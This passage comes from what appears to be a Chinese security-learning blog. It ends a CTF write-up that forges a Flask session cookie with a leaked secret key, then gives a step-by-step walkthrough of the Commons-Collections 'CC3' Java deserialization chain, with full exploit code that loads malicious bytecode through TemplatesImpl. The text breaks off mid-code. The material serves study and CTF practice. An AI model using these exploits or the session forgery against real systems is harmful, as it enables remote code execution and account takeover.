href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h2><p>登录后源码中给了一个&#x2F;wor路由，访问发现没啥东西，然后把session随便删除点东西页面报错，开启了debug在源码中找到key <code>hardgam3_C0u1d_u_f1ndM3????&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150428.png" alt="image-20230604215051392"><br>接下来就和前面一样伪造session就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s hardgam3_C0u1d_u_f1ndM3???? -c &quot;session&quot;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s hardgam3_C0u1d_u_f1ndM3???? -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line">//伪造的时候把time删除，不然会报错</span><br></pre></td></tr></table></figure><h2 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h2><p>0解题，看了wp有点难，不想复现了<br>wp：<a href="https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/">https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/</a></p><p>参考：<br><a href="https://www.cnblogs.com/F12-blog/p/17455819.html">NSSCTF Round#13 web专项 - F12~ - 博客园 (cnblogs.com)</a><br><a href="https://ph0ebus.cn/post/NSSRound13%20WEB.html#ez_factors">NSSCTFRound#13 Web · ph0ebus’s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链3</title>
      <link href="/undefined/28758.html"/>
      <url>/undefined/28758.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最近几周没碰Java感觉又有点生疏了，在CC3中命令执行的方法和1，6不一样，这里用的是动态类加载，使用<code>defineClass-&gt;newInstance</code> 来命令执行即在字节里面加载一个类然后实例化执行代码，所以直接从这里入手逆推，还是find usages寻找哪里调用了defineClass，因为它是一个protected所以我们需要一个调用它public方法，最终在TemplatesImpl类的<code>static final class TransletClassLoader</code>下找到defineClass这里没有标注作用域即默认为defalut，也就是自己的类里面可以调用<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733679.png" alt="image-20230603173329428"><br>继续find usages发现defineTransletClasses私有方法里面调用了<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733726.png" alt="image-20230603173354505"><br>这里<code>_bytecodes</code>不能为空不然就不能执行到defineClass方法了，然后继续find usages最终找到了getTransletInstance方法并且这里有个<code>newInstance()</code>实例化的过程，动态执行代码正好需要实例化，所以如果走完这个函数就相当于结束了，但是这个getTransletInstance方法是私有，所以还得继续找，最终找到了newTransformer方法，里面调用了getTransletInstance方法，并且newTransformer方法是public，接下来就是利用了<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734855.png" alt="image-20230603173407614"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>上面两行代码其实就是命令执行的代码，但是肯定有很多限制条件让它无法执行，所以接下来就是满足所有条件让它执行，首先是下面的这些条件<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734199.png" alt="image-20230603173436099"><br><code>_name</code>不能为空，<code>_class</code>必须为空这样才能进入<code>defineTransletClasses()</code>方法，然后跟进这个方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734897.png" alt="image-20230603173450789"><br><code>_bytecodes</code>不能为空，否则抛异常，<code>_tfactory</code>需要调方法所以也需要赋值，然后开始构造EXP</p><h2 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h2><p>通过反射获取属性，<code>_name</code>的值是String先随便赋一个，<code>_class</code>初始值就为空不用管，然后是<code>_bytecodes</code>是一个二维数组，但是传入defineClass方法的值是一维数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个一维数组存放的是恶意字节码，也就是命令执行的class文件，所以我们先把这个写完</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个也可以放构造函数里面，实例化的时候能加载就行，这部分对于的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\java-tools\\CC链\\CC3\\&quot;</span>));  </span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br></pre></td></tr></table></figure><p>这样就完成了二维数组赋值，传给defineClass方法的也是存放恶意字节码的一维数组<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735515.png" alt="image-20230603173507470"><br>循环取值，相当于第一个值就是存放恶意字节码的一维数组，这个<code>_bytecodes</code>赋值就解决了<br>然后是<code>_tfactory</code>赋值，它的定义如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>有个transient表示它是个不可序列化的变量，那么我们传值就没有意义了，反序列化的时候就会丢失，最后在readObject中找到它的初始定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure><p>这里不为空，所以直接反射赋值为TransformerFactoryImpl即可，到这里该满足的条件都满足了，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是到这里报了空指针错误<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735495.png" alt="image-20230603173521394"><br>本来想调试一下，但是发现环境好像有点问题不能在这个类下调试，直接去422看报错也行，<br>在418行会判断恶意类是否继承了ABSTRACT_TRANSLET这个类否则报错，即<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET))</span><br></pre></td></tr></table></figure><p>或者我们给<code>_auxClasses</code>赋值让它不为空，但是这样<code>_transletIndex</code>为-1会在下面的判断直接跳出程序，这个方法就不可取，所以直接让恶意类继承AbstractTranslet类，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行代码弹出成功<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735250.png" alt="image-20230603173533124"></p><h2 id="CC1-的TemplatesImpl的实现方式"><a href="#CC1-的TemplatesImpl的实现方式" class="headerlink" title="CC1 的TemplatesImpl的实现方式"></a>CC1 的TemplatesImpl的实现方式</h2><p>由于上面的部分我们只是更改的最后命令执行的方法，前面的链子仍然没有变，所以这里和CC1的前半段结合一下，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//最后这里赋值是因为new ConstantTransformer(templates)这里定义的类需要一个参数</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735670.png" alt="image-20230603173548540"><br>然后把CC1后面的全部拿过来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);  </span></span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandler解决proxyMap不能序列化，然后通过构造方法将代理对象proxyMap赋值给memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化与反序列化  </span></span><br><span class="line"><span class="comment">//        serialize(invocationHandler);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736820.png" alt="image-20230603173603684"><br>目前的流程图如下<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736425.png" alt="image-20230603173633352"><br>CC6和这个也差不多的也能通</p><h2 id="继续分析CC3"><a href="#继续分析CC3" class="headerlink" title="继续分析CC3"></a>继续分析CC3</h2><p>现在我们已经找到了命令执行的类和方法也就是<code>TemplatesImpl.newTransformer()</code>前面是和CC1的前半部分链起来的相当于如果过滤了<code>Runtime.exec()</code>那就可以换种方法来执行代码，如果过滤了<code>InvokerTransform.transform</code>呢？也是有别的链来到命令执行的，这就是CC3，所以我们继续使用find usages往前找，最终找到了TrAXFilter这个类<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031736796.png" alt="image-20230603173655608"><br>这个类也是不能序列化的没办法传参(其实这里有点不太明白不能传参意味着什么)，那么只能从构造方法入手</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_transformer = (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure><p>可以看到只要执行了构造方法就能到<code>newTransformer()</code>命令执行，在这里CC3作者调用了一个新的类<code>InstantiateTransformer</code>我们去看一下它的<code>transform</code>方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031737397.png" alt="image-20230603173706325"><br>这样就刚刚好符合需求然后构造EXP</p><h2 id="CC3-EXP"><a href="#CC3-EXP" class="headerlink" title="CC3 EXP"></a>CC3 EXP</h2><p>通过<code>InstantiateTransformer</code>来调用<code>TrAXFilter</code>类的构造方法解决如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);  </span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>测试成功，然后使用CC1的前半部分去调transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  